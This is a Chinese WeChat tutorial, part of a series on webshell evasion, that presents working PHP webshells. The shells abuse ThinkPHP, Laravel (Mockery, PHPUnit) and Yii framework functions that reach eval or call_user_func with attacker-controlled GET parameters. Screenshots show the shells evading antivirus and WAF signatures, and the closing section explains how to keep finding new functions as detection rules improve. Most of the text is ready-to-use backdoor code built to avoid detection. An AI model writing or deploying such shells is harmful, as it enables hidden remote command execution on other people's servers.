<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_31K7YYjCI7VJtp_T-dFVg)

基于框架免杀
======

thinkphp
--------

### array_map_recursive 函数

```
<?phpdefine('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));include(WWW_PATH."ThinkPHP/Common/functions.php");array_map_recursive(I('get.func','',''),I('get.cmd','',''));
```

array_map_recursive 函数分析

这里存在一个 call_user_func 命令执行函数

```
function array_map_recursive($filter, $data) {     $result = array();     foreach ($data as $key => $val) {         $result[$key] = is_array($val)             ? array_map_recursive($filter, $val)             : call_user_func($filter, $val);     }     return $result; }
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1astv8w3z13prhfJKOym1Z7oCLvlkx1YFHnCiaeqMwzJu0DNnaz2k64w/640?wx_fmt=png)

免杀效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV12LLpN3Y0riaEdSCIXUdiaRO9qiceLaG2B1ff8yWzZSHeXBonaP0a1royA/640?wx_fmt=png)

### B 函数

```
<?phpdefine('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));include(WWW_PATH."ThinkPHP/Common/functions.php");include(WWW_PATH."ThinkPHP/Library/Think/Hook.class.php");class demo{    function test($v){        I('get.func','','')($v);    \}\}B("demo","test",I('get.cmd','',''));
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1C67AcFcwUY0TwsZT11XZbfUfsSdZicCq1JXf53jA8vqa2Z41mS5Q0Qw/640?wx_fmt=png)

免杀效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1Moo56kBcgkmXjwZhOJhknFxIyuGV77Myfgd3pcNMHEica3nbLdahFSQ/640?wx_fmt=png)

B 函数分析

```
function B($name, $tag='',&$params=NULL) {    if(''==$tag){        $name   .=  'Behavior';    }    return \Think\Hook::exec($name,$tag,$params);}
```

exec 函数分析

在 exec 函数用存在有个类调用，且所有的参数都可控

```
static public function exec($name, $tag,&$params=NULL) {        if('Behavior' == substr($name,-8) ){            // 行为扩展必须用run入口方法            $tag    =   'run';        }        $addon   = new $name();        return $addon->$tag($params);    }
```

### smarty_php_tag 函数

```
<?phpdefine('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));include(WWW_PATH."ThinkPHP/Library/Vendor/Smarty/SmartyBC.class.php");smarty_php_tag("",I('get.cmd','',''),"");
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV10wvyd7kppTGuRSCpPgfSxQxrUVshhL5pTic6lQ0G30AHpcVALGQEQtQ/640?wx_fmt=png)

免杀效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1Wkph6nAXSprmgAps2mgKZ4CzJRDyarDwtr1zKRhJiae2wdt04YTOyTA/640?wx_fmt=png)

smarty_php_tag 函数分析

直接存在命令执行，且参数可控

```
function smarty_php_tag($params, $content, $template, &$repeat){    eval($content);    return '';}
```

### I 函数

```
<?phpdefine('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));include(WWW_PATH."ThinkPHP/Common/functions.php");I('get.func','','')(I('get.cmd','',''));
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV160Mqc3YSGLGUoqnnXwQiaDoSunfX8Mg3L4iatXLseDMich5JejEj0YiaSA/640?wx_fmt=png)

免杀效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1vVZZv0cDwYoYcqMQOyIIXqgyQ3hb0MYbcAgEj52Za3KsmryVy7IJIg/640?wx_fmt=png)

Laravel
-------

### EvalLoader#load

```
<?phpdefine('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));include(WWW_PATH."/vendor/autoload.php");$c = new Mockery\Generator\MockConfiguration(array(),array(),array(),'demo');$b = new Mockery\Generator\MockDefinition($c,'<?='.$_GET['cmd']);$a = new Mockery\Loader\EvalLoader();$a->load($b);
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1hibhqIIu1HG834j3kqNwJN1ibSmdnb1AEqNYSTkcth9ibQGSvohq4Qicjg/640?wx_fmt=png)

免杀效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1Ce27xhL2SA8OLOAXzGzLCf6pfkmgc4ZtZ19dFqxwPgAsQvc3sFusuQ/640?wx_fmt=png)

### EvalLoader#load 分析

eval 命令执行函数，参数可控

```
class EvalLoader implements Loader{    public function load(MockDefinition $definition)    {        if (class_exists($definition->getClassName(), false)) {            return;        }        eval("?>" . $definition->getCode());    \}\}
```

### MockTrait#generate

```
<?phpdefine('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));include(WWW_PATH."/vendor/autoload.php");$a = new PHPUnit\Framework\MockObject\MockTrait($_GET['cmd'],'demo');$a->generate();
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1oayb9bEPibhje9cxyiahunWK5aaD8lTZbz6XBGvhtjXuZBJUaooIUUAg/640?wx_fmt=png)

免杀效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1zxeVRV3Gz9QCQ4h6CyibJl89ic9vDjYmS0swPad1cX0YsTcJibdCmwia3g/640?wx_fmt=png)

### MockTrait#generate 函数分析

存在一个 eval 函数

```
public function generate(): string    {        if (!\class_exists($this->mockName, false)) {            eval($this->classCode);        }        return $this->mockName;    }
```

yii
---

### MockTrait#generate

```
<?phpdefine('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));include(WWW_PATH."/vendor/autoload.php");$a = new PHPUnit\Framework\MockObject\MockTrait($_GET['cmd'],'demo');$a->generate();
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1oayb9bEPibhje9cxyiahunWK5aaD8lTZbz6XBGvhtjXuZBJUaooIUUAg/640?wx_fmt=png)

免杀效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1zxeVRV3Gz9QCQ4h6CyibJl89ic9vDjYmS0swPad1cX0YsTcJibdCmwia3g/640?wx_fmt=png)

### view#evaluateDynamicContent

```
<?phpdefine('WWW_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));include(WWW_PATH."/vendor/autoload.php");$a = new yii\base\View();$a->evaluateDynamicContent($_GET['cmd']);
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1oayb9bEPibhje9cxyiahunWK5aaD8lTZbz6XBGvhtjXuZBJUaooIUUAg/640?wx_fmt=png)

免杀效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6qUSicJHfIRQozNzSwiaUyV1zxeVRV3Gz9QCQ4h6CyibJl89ic9vDjYmS0swPad1cX0YsTcJibdCmwia3g/640?wx_fmt=png)

### view#evaluateDynamicContent 分析

```
public function evaluateDynamicContent($statements)    {        return eval($statements);    }
```

总结
--

通过文件包含框架文件，用框架内置的函数来替换一句话木马中的功能函数，达到绕过特征匹配，如果后期规则增强，可以通过搜索新的函数来间接调用函数，像反序列化利用链一样，当然，还有很多其他函数可以使用在这里就不多列举。

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

什么？你还不会 webshell 免杀？（一）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[什么？你还不会 webshell 免杀？（三）](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500845&idx=1&sn=73e9a559ce1c1d48b6895d87cfcda078&chksm=ce677e91f910f787c4c8c403dfb3e23027bb379e47053a1b3f489d8487d86b75f7dd6286fa05&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)